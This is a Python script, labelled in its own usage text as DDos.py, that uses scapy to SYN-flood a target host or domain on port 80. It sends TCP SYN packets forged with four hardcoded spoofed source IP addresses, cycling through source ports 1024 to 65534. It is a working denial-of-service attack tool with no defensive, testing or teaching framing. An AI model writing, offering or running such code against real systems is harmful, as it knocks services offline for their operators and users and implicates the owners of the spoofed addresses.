#!/usr/bin/env python3
# -*- coding:utf-8 -*-


# =============================================================================
# File Name: thread_sync_base.py
# Author: DaiDai
# Mail: daidai4269@aliyun.com
# Created Time: Tue 10 Sep 2019 03:18:18 PM CST
# =============================================================================


"""
shell script:
    sudo pip install scapy
    sudo scapy
    python3 DDos.py [IP or domain]
"""


import random
import socket
import time
from scapy.all import *
import sys


def synFlood(tgt,dPort):
    srcList = ['11.1.1.2', '22.1.1.102', '33.1.1.2', '125.130.5.199']

    for sPort in range(1024, 65535):
        index = random.randrange(4)

        ipLayer = IP(src=srcList[index], dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort,flags='S')
        packet = ipLayer/tcpLayer
        send(packet)


if __name__ == "__main__":
    if len(sys.argv) == 2:
        domain = "{}".format(sys.argv[1])
        tgt = socket.gethostbyname(domain)
        print(tgt)
        dPort = 80
        synFlood(tgt, dPort)
